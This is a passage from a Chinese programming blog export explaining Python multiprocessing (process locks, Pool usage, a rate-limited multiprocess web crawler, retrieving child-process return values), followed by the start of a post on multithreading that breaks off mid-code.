<h2 id="案例三-进程锁"><a href="#案例三-进程锁" class="headerlink" title="案例三 进程锁"></a>案例三 进程锁</h2><p>一般来说每个进程使用单独的空间，不必加进程锁的，但是如果你需要先实现进程数据共享，<strong>使用案例二中的代码</strong>，又害怕造成数据抢夺和脏数据的问题。就可以设置进程锁，与threading类似，在multiprocessing里也有同名的锁类RLock，Lock，Event，Condition和 Semaphore，连用法都是一样样的。</p>
<p><strong>如果有多个进程要上锁，使用multiprocessing.Manager().BoundedSemaphore(1)</strong></p>
<p>代码实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from multiprocessing import Array</span><br><span class="line">from multiprocessing import RLock, Lock, Event, Condition, Semaphore</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def func(i,lis,lc):</span><br><span class="line">    lc.acquire()</span><br><span class="line">    lis[0] = lis[0] - 1</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&apos;say hi&apos;, lis[0])</span><br><span class="line">    lc.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    array = Array(&apos;i&apos;, 1)</span><br><span class="line">    array[0] = 10</span><br><span class="line">    lock = RLock()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        p = Process(target=func, args=(i, array, lock))</span><br><span class="line">        p.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">say hi 9</span><br><span class="line">say hi 8</span><br><span class="line">say hi 7</span><br><span class="line">say hi 6</span><br><span class="line">say hi 5</span><br><span class="line">say hi 4</span><br><span class="line">say hi 3</span><br><span class="line">say hi 2</span><br><span class="line">say hi 1</span><br><span class="line">say hi 0</span><br></pre></td></tr></table></figure>

<h2 id="案例四-进程池"><a href="#案例四-进程池" class="headerlink" title="案例四 进程池"></a>案例四 进程池</h2><p>from multiprocessing import Pool导入就行，非常容易使用的。进程池内部维护了一个进程序列，需要时就去进程池中拿取一个进程，如果进程池序列中没有可供使用的进程，那么程序就会等待，直到进程池中有可用进程为止。</p>
<ol>
<li>apply() 同步执行（串行）</li>
<li>apply_async() 异步执行（并行）</li>
<li>terminate() 立刻关闭进程池</li>
<li>join() 主进程等待所有子进程执行完毕。必须在close或terminate()之后。</li>
<li>close() 等待所有进程结束后，才关闭进程池。</li>
</ol>
<p>代码实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import time</span><br><span class="line">def func(args):</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;正在执行进程 &quot;, args)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    p = Pool(5)     # 创建一个包含5个进程的进程池</span><br><span class="line">    for i in range(30):</span><br><span class="line">        # 有30个任务</span><br><span class="line">        p.apply_async(func=func, args=(i,))</span><br><span class="line">        # 异步执行，并发。这里不用target，要用func</span><br><span class="line">    p.close()           # 等子进程执行完毕后关闭进程池</span><br><span class="line">    # time.sleep(2)</span><br><span class="line">    # p.terminate()     # 立刻关闭进程池</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>

<p>from multiprocessing.dummy import Pool as ThreadPool 是多线程进程池，绑定一个cpu核心。from multiprocessing import Pool多进程，运行于多个cpu核心。multiprocessing 是多进程模块， 而multiprocessing.dummy是以相同API实现的多线程模块。<br>没有绕过GIL情况下，多线程一定受GIL限制。</p>
<p>代码实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing.dummy import Pool as tp</span><br><span class="line">def fun(i):</span><br><span class="line">    print i+i+i+i</span><br><span class="line"></span><br><span class="line">list_i=[range(100)]</span><br><span class="line"></span><br><span class="line">px = tp(processes=8)</span><br><span class="line"># 开启8个线程池</span><br><span class="line">px.map(fun,list_i)</span><br><span class="line">px.close()</span><br><span class="line">px.join()</span><br></pre></td></tr></table></figure>

<p>使用dummy方法可以不用<strong>name</strong>=’<strong>main</strong>‘，并且用法很简单，开启线程池用法一样，需要注意的是导入的参数，要在一个列表中导入。比如你有一批数据要放进这个线程池，就直接把这批数据放在一个列表中。</p>
<h2 id="案例五-爬虫进程池"><a href="#案例五-爬虫进程池" class="headerlink" title="案例五 爬虫进程池"></a>案例五 爬虫进程池</h2><p>案例来自<a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/" target="_blank" rel="noopener">莫凡</a></p>
<h4 id="什么是分布式爬虫"><a href="#什么是分布式爬虫" class="headerlink" title="什么是分布式爬虫"></a>什么是分布式爬虫</h4><p>分布式爬虫主要是为了非常有效率的抓取网页, 我们的程序一般是单线程跑的, 指令也是一条条处理的, 每执行完一条指令才能跳到下一条. 那么在爬虫的世界里, 这里存在着一个问题.</p>
<p>如果你已经顺利地执行过了前几节的爬虫代码, 你会发现, 有时候代码运行的时间大部分都花在了下载网页上. 有时候不到一秒能下载好一张网页的 HTML, 有时候却要几十秒. 而且非要等到 HTML 下载好了以后, 才能执行网页分析等步骤. 这非常浪费时间.</p>
<p>如果我们能合理利用计算资源, 在下载一部分网页的时候就已经开始分析另一部分网页了. 这将会大大节省整个程序的运行时间. 又或者, 我们能同时下载多个网页, 同时分析多个网页, 这样就有种事倍功半的效用. 分布式爬虫的体系有很多种, 处理优化的问题也是多样的. 这里有一篇博客可以当做扩展阅读, 来了解当今比较流行的分布式爬虫框架.</p>
<h4 id="我们的分布式爬虫"><a href="#我们的分布式爬虫" class="headerlink" title="我们的分布式爬虫"></a>我们的分布式爬虫</h4><p>而今天我们想搭建的这一个爬虫, 就是同时下载, 同时分析的这一种类型的分布式爬虫. 虽然算不上特别优化的框架, 但是概念理解起来比较容易. 我有尝试过徒手写高级一点的分布式爬虫, 但是写起来非常麻烦. 我琢磨了一下, 打算给大家介绍的这种分布式爬虫代码也较好写, 而且效率比普通爬虫快了3.5倍. 我也特地画了张图给大家解释一下要搭建的分布式爬虫.</p>
<p><img src="/articles/a5c1f14c/1.png" alt="img"></p>
<p>主要来说, 我们最开始有一个网页, 比如说是莫烦Python的首页, 然后首页中有很多 url, 我们使用多进程 (Python多进程教程) 同时开始下载这些 url, 得到这些 url 的 HTML 以后, 同时开始解析 (比如 BeautifulSoup) 网页内容. 在网页中寻找这个网站还没有爬过的链接. 最终爬完整个 莫烦 Python 网站所有页面.</p>
<p>有了这种思路, 我们就可以开始写代码了. 你可以在我的 Github 一次性观看全部代码.</p>
<p>首先 import 全部要用的模块, 并规定一个主页. 注意, 我用这份代码测试我内网的网站(速度不受外网影响) 所以使用的 base_url 是 “<a href="http://127.0.0.1:4000/”" target="_blank" rel="noopener">http://127.0.0.1:4000/”</a>, 如果你要爬 莫烦Python, 你的 base_url 要是 “<a href="https://morvanzhou.github.io/”" target="_blank" rel="noopener">https://morvanzhou.github.io/”</a> (下载速度会受外网影响).</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import multiprocessing as mp</span><br><span class="line">import time</span><br><span class="line">from urllib.request import urlopen, urljoin</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># base_url = &quot;http://127.0.0.1:4000/&quot;</span><br><span class="line">base_url = &apos;https://morvanzhou.github.io/&apos;</span><br></pre></td></tr></table></figure>

<p>我们定义两个功能, 一个是用来爬取网页的(crawl), 一个是解析网页的(parse). 有了前几节内容的铺垫, 你应该能一言看懂下面的代码. crawl() 用 urlopen 来打开网页, 我用的内网测试, 所以为了体现下载网页的延迟, 添加了一个 time.sleep(0.1) 的下载延迟. 返回原始的 HTML 页面, parse() 就是在这个 HTML 页面中找到需要的信息, 我们用 BeautifulSoup 找 (BeautifulSoup 教程). 返回找到的信息.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def crawl(url):</span><br><span class="line">    response = urlopen(url)</span><br><span class="line">    # time.sleep(0.1)             # slightly delay for downloading</span><br><span class="line">    return response.read().decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse(html):</span><br><span class="line">    soup = BeautifulSoup(html, &apos;lxml&apos;)</span><br><span class="line">    urls = soup.find_all(&apos;a&apos;, &#123;&quot;href&quot;: re.compile(&apos;^/.+?/$&apos;)&#125;)</span><br><span class="line">    title = soup.find(&apos;h1&apos;).get_text().strip()</span><br><span class="line">    page_urls = set([urljoin(base_url, url[&apos;href&apos;]) for url in urls])   # 去重</span><br><span class="line">    url = soup.find(&apos;meta&apos;, &#123;&apos;property&apos;: &quot;og:url&quot;&#125;)[&apos;content&apos;]</span><br><span class="line">    return title, page_urls, url</span><br></pre></td></tr></table></figure>

<p>网页中爬取中, 肯定会爬到重复的网址, 为了去除掉这些重复, 我们使用 python 的 set 功能. 定义两个 set, 用来搜集爬过的网页和没爬过的.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unseen = set([base_url,])</span><br><span class="line">seen = set()</span><br></pre></td></tr></table></figure>

<h4 id="测试普通爬法"><a href="#测试普通爬法" class="headerlink" title="测试普通爬法"></a>测试普通爬法</h4><p>为了对比效果, 我们将在下面对比普通的爬虫和这种分布式的效果. 如果是普通爬虫, 我简化了一下接下来的代码, 将一些不影响的代码去除掉了, 如果你想看全部的代码, 请来到我的 Github. 我们用循环一个个 crawl unseen 里面的 url, 爬出来的 HTML 放到 parse 里面去分析得到结果. 接着就是更新 seen 和 unseen 这两个集合了.</p>
<p>特别注意: 任何网站都是有一个服务器压力的, 如果你爬的过于频繁, 特别是使用多进程爬取或异步爬取, 一次性提交请求给服务器太多次, 这将可能会使得服务器瘫痪, 你可能再也看不到莫烦 Python 了. 所以为了安全起见, 我限制了爬取数量(restricted_crawl=True). 因为我测试使用的是内网 “<a href="http://127.0.0.1:4000/”" target="_blank" rel="noopener">http://127.0.0.1:4000/”</a> 所以不会有这种压力. 你在以后的爬网页中, 会经常遇到这样的爬取次数的限制 (甚至被封号). 我以前爬 github 时就被限制成一小时只能爬60页.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># DON&apos;T OVER CRAWL THE WEBSITE OR YOU MAY NEVER VISIT AGAIN</span><br><span class="line">if base_url != &quot;http://127.0.0.1:4000/&quot;:</span><br><span class="line">    restricted_crawl = True</span><br><span class="line">else:</span><br><span class="line">    restricted_crawl = False</span><br><span class="line"></span><br><span class="line">while len(unseen) != 0:                 # still get some url to visit</span><br><span class="line">    if restricted_crawl and len(seen) &gt;= 20:</span><br><span class="line">        break</span><br><span class="line">    htmls = [crawl(url) for url in unseen]</span><br><span class="line">    results = [parse(html) for html in htmls]</span><br><span class="line"></span><br><span class="line">    seen.update(unseen)         # seen the crawled</span><br><span class="line">    unseen.clear()              # nothing unseen</span><br><span class="line"></span><br><span class="line">    for title, page_urls, url in results:</span><br><span class="line">        unseen.update(page_urls - seen)     # get new url to crawl</span><br></pre></td></tr></table></figure>

<p>使用这种单线程的方法, 在我的内网上面爬, 爬完整个 莫烦Python, 一共消耗 52.3秒. 接着我们把它改成多进程分布式.</p>
<h4 id="测试分布式爬法"><a href="#测试分布式爬法" class="headerlink" title="测试分布式爬法"></a>测试分布式爬法</h4><p>还是上一个 while 循环, 首先我们创建一个进程池(Pool). 不太懂进程池的朋友看过来. 然后我们修改得到 htmls 和 results 的两句代码. 其他都不变, 只将这两个功能给并行了. 我在这里写的都是简化代码, 你可以在这里 看到完整代码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pool = mp.Pool(4)</span><br><span class="line">while len(unseen) != 0:</span><br><span class="line">    # htmls = [crawl(url) for url in unseen]</span><br><span class="line">    # ---&gt;</span><br><span class="line">    crawl_jobs = [pool.apply_async(crawl, args=(url,)) for url in unseen]</span><br><span class="line">    htmls = [j.get() for j in crawl_jobs]</span><br><span class="line"></span><br><span class="line">    # results = [parse(html) for html in htmls]</span><br><span class="line">    # ---&gt;</span><br><span class="line">    parse_jobs = [pool.apply_async(parse, args=(html,)) for html in htmls]</span><br><span class="line">    results = [j.get() for j in parse_jobs]</span><br></pre></td></tr></table></figure>

<p>还是在内网测试, 只用了 16.3秒!! 这可比上面的单线程爬虫快了3.5倍. 而且我还不是在外网测试的. 如果在外网, 爬取一张网页的时间更长, 使用多进程会更加有效率, 节省的时间更多.</p>
<h2 id="各模块作用"><a href="#各模块作用" class="headerlink" title="各模块作用"></a>各模块作用</h2><h4 id="Process介绍"><a href="#Process介绍" class="headerlink" title="Process介绍"></a>Process介绍</h4><p>构造方法:</p>
<ol>
<li>Process([group [, target [, name [, args [, kwargs]]]]])</li>
<li>group: 线程组，目前还没有实现，库引用中提示必须是None；</li>
<li>target: 要执行的方法；</li>
<li>name: 进程名；</li>
<li>args/kwargs: 要传入方法的参数。</li>
</ol>
<p>实例方法:</p>
<ol>
<li>is_alive()：返回进程是否在运行。</li>
<li>join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的3. timeout（可选参数）。</li>
<li>start()：进程准备就绪，等待CPU调度。</li>
<li>run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。</li>
<li>terminate()：不管任务是否完成，立即停止工作进程。</li>
</ol>
<p>属性：</p>
<ol>
<li>authkey</li>
<li>daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。</li>
<li>exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。</li>
<li>name：进程名字。</li>
<li>pid：进程号。</li>
</ol>
<h4 id="Pool介绍"><a href="#Pool介绍" class="headerlink" title="Pool介绍"></a>Pool介绍</h4><p>Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用Process类。</p>
<p>构造方法：</p>
<ol>
<li>Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])</li>
<li>processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。</li>
<li>initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。</li>
<li>maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。</li>
<li>context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。</li>
</ol>
<p>实例方法：</p>
<ol>
<li>apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。</li>
<li>apply(func[, args[, kwds]])是阻塞的</li>
<li>close() 关闭pool，使其不在接受新的任务。</li>
<li>terminate() 关闭pool，结束工作进程，不在处理未完成的任务。</li>
<li>join() 主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。</li>
</ol>
<p>Pool使用方法</p>
<p>Pool+map函数</p>
<p>说明：此写法缺点在于只能通过map向函数传递一个参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">def test(i):</span><br><span class="line">    print i</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    lists=[1,2,3]</span><br><span class="line">    pool=Pool(processes=2) #定义最大的进程数</span><br><span class="line">    pool.map(test,lists)        #p必须是一个可迭代变量。</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>

<p>异步进程池（非阻塞）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">def test(i):</span><br><span class="line">    print i</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(processes=10)</span><br><span class="line">    for i  in xrange(500):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        For循环中执行步骤：</span><br><span class="line">        （1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）</span><br><span class="line">        （2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）</span><br><span class="line"></span><br><span class="line">        apply_async为异步进程池写法。</span><br><span class="line">        异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        pool.apply_async(test, args=(i,)) #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       </span><br><span class="line">    print “test”</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>

<p>执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）</p>
<p>注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。</p>
<p>同步进程池（阻塞）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">def test(p):</span><br><span class="line">       print p</span><br><span class="line">       time.sleep(3)</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(processes=10)</span><br><span class="line">    for i  in xrange(500):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    实际测试发现，for循环内部执行步骤：</span><br><span class="line">    （1）遍历500个可迭代对象，往进程池放一个子进程</span><br><span class="line">    （2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）</span><br><span class="line">    for循环执行完毕，再执行print函数。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">        pool.apply(test, args=(i,))   #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.</span><br><span class="line">    print “test”</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>

<p>说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发）</p>
<h4 id="子进程返回值"><a href="#子进程返回值" class="headerlink" title="子进程返回值"></a>子进程返回值</h4><p>在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。</p>
<p>初级用法（Pool）</p>
<p>目的：存储子进程返回值</p>
<p>说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。</p>
<p>实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">def test(p):     </span><br><span class="line">    return p</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(processes=10)</span><br><span class="line">    result=[]</span><br><span class="line">    for i  in xrange(50000):</span><br><span class="line">       &apos;&apos;&apos;</span><br><span class="line">       for循环执行流程：</span><br><span class="line">       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）</span><br><span class="line">       （2）执行子进程（同时执行10个）</span><br><span class="line">       &apos;&apos;&apos;</span><br><span class="line">       result.append(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span><br><span class="line">    pool.join()</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    for i in result:</span><br><span class="line">        print i.get()</span><br></pre></td></tr></table></figure>

<p>错误写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i  in xrange(50000):</span><br><span class="line">   t=pool.apply_async(test, args=(i,)))</span><br><span class="line">   print t.get()</span><br></pre></td></tr></table></figure>

<p>说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。</p>
<p>高级用法（Pool）<br>目的：父进程实时获取子进程返回值，以此为标记结束所有进程。</p>
<p>实例（一）<br>执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import Queue</span><br><span class="line">import time</span><br><span class="line">def test(p):</span><br><span class="line">    time.sleep(0.001)</span><br><span class="line">    if p==10000:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(processes=10)</span><br><span class="line">    q=Queue.Queue()</span><br><span class="line">    for i  in xrange(50000):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        将子进程对象存入队列中。</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        q.put(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    while 1:</span><br><span class="line">        if q.get().get():</span><br><span class="line">            pool.terminate() #结束进程池中的所有子进程。</span><br><span class="line">            break</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>

<p>说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。</p>
<p>优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。</p>
<p>不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。</p>
<p>实例（二）</p>
<p>多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">def test(p):</span><br><span class="line">    time.sleep(0.001)</span><br><span class="line">    if p==10000:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    result=Queue.Queue() #队列</span><br><span class="line">    pool = Pool()</span><br><span class="line">    def pool_th():</span><br><span class="line">        for i  in xrange(50000000): ##这里需要创建执行的子进程非常多</span><br><span class="line">            try:</span><br><span class="line">                result.put(pool.apply_async(test, args=(i,)))</span><br><span class="line">            except:</span><br><span class="line">                break</span><br><span class="line">    def result_th():</span><br><span class="line">        while 1:</span><br><span class="line">            a=result.get().get() #获取子进程返回值</span><br><span class="line">            if a:</span><br><span class="line">                pool.terminate() #结束所有子进程</span><br><span class="line">                break</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    t1=threading.Thread(target=pool_th)</span><br><span class="line">    t2=threading.Thread(target=result_th)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>

<p>执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。</p>
<p>优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。</p>
]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之多线程详解</title>
    <url>/articles/e0b461d5.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务，多线程就是在一个进程中的多个线程，如果使用多线程默认开启一个主线程，按照程序需求自动开启多个线程(也可以自己定义线程数)。</p>
<a id="more"></a>

<h2 id="多线程知识点"><a href="#多线程知识点" class="headerlink" title="多线程知识点"></a>多线程知识点</h2><ol>
<li>Python 在设计之初就考虑到要在解释器的主循环中，同时只有一个线程在执行，即在任意时刻，只有一个线程在解释器中运行。对Python 虚拟机的访问由全局解释器锁（GIL）来控制，正是这个锁能保证同一时刻只有一个线程在运行。</li>
<li>多线程共享主进程的资源，所以可能还会改变其中的变量，这个时候就要加上线程锁，每次执行完一个线程在执行下一个线程。</li>
<li>因为每次只能有一个线程运行，多线程怎么实现的呢？Python解释器中一个线程做完了任务然后做IO(文件读写)操作的时候，这个线程就退出，然后下一个线程开始运行，循环之。</li>
<li>当你读完上面三点你就知道多线程如何运行起来，并且知道多线程常用在那些需要等待然后执行的应用程序上(比如爬虫读取到数据，然后保存的时候下一个线程开始启动)也就是说多线程适用于IO密集型的任务量（文件存储，网络通信）。</li>
<li>注意一点，定义多线程，然后传递参数的时候，如果是有一个参数就是用args=（i，）一定要加上逗号，如果有两个或者以上的参数就不用这样。</li>
</ol>
<h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><h4 id="案例一-多线程核心用法"><a href="#案例一-多线程核心用法" class="headerlink" title="案例一 多线程核心用法"></a>案例一 多线程核心用法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line"></span><br><span class="line">def loop():</span><br><span class="line">    #定义一个要循环的函数，当然后面肯定会定义好几个函数</span><br><span class="line">    print &apos;thread %s is running...&apos; % threading.current_thread().name</span><br><span class="line">    #threading.current_thread().name就是当前线程的名字  在声明线程的时候可以自定义子线程的名字</span><br><span class="line">    n = 0</span><br><span class="line">    while n &lt; 10:</span><br><span class="line">        n = n + 1</span><br><span class="line">        print &apos;%s &gt;&gt;&gt; %s&apos; % (threading.current_thread().name, n)</span><br><span class="line">        #输出当前线程名字  和循环的参数n</span><br><span class="line">    print &apos;thread %s ended.&apos; % threading.current_thread().name</span><br><span class="line">print &apos;thread %s is running...&apos; % threading.current_thread().name</span><br><span class="line"></span><br><span class="line">#下面的一部分就是threading的核心用法</span><br><span class="line">#包括target name args 之类的 一般我只用targer=你定义的函数名</span><br><span class="line">t = threading.Thread(target=loop, name=&apos;线程名:&apos;)</span><br><span class="line"># 在这里就申明了这个线程的名字</span><br><span class="line">t.start()</span><br><span class="line">#开始</span><br><span class="line">t.join()</span><br><span class="line">#关于join的相关信息我会在后面的代码详说</span><br><span class="line">print &apos;thread %s ended.&apos; % threading.current_thread().name</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thread MainThread is running...</span><br><span class="line">thread 线程名: is running...</span><br><span class="line">线程名: &gt;&gt;&gt; 1</span><br><span class="line">线程名: &gt;&gt;&gt; 2</span><br><span class="line">线程名: &gt;&gt;&gt; 3</span><br><span class="line">线程名: &gt;&gt;&gt; 4</span><br><span class="line">线程名: &gt;&gt;&gt; 5</span><br><span class="line">线程名: &gt;&gt;&gt; 6</span><br><span class="line">线程名: &gt;&gt;&gt; 7</span><br><span class="line">线程名: &gt;&gt;&gt; 8</span><br><span class="line">线程名: &gt;&gt;&gt; 9</span><br><span class="line">线程名: &gt;&gt;&gt; 10</span><br><span class="line">thread 线程名: ended.</span><br><span class="line">thread MainThread ended.</span><br></pre></td></tr></table></figure>

<h4 id="案例二-线程锁"><a href="#案例二-线程锁" class="headerlink" title="案例二 线程锁"></a>案例二 线程锁</h4><p>前面有说到过，多线程是共享内存的，所以其中的变量如果发生了改变的话就会改变后边的变量，导致异常，这个时候可以加上线程锁。线程锁的概念就是主要这个线程运行完后再运行下一个线程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line"></span><br><span class="line">def loop():</span><br><span class="line">    l.acquire()</span><br><span class="line">    # 这里相当于把线程加了锁，目前只允许这一个线程运行</span><br><span class="line">    print &apos;thread %s is running...&apos; % threading.current_thread().name</span><br><span class="line">    #threading.current_thread().name就是当前线程的名字  在声明线程的时候可以自定义子线程的名字</span><br><span class="line">    n = 0</span><br><span class="line">    while n &lt; 10:</span><br><span class="line">        n = n + 1</span><br><span class="line">        print &apos;%s &gt;&gt;&gt; 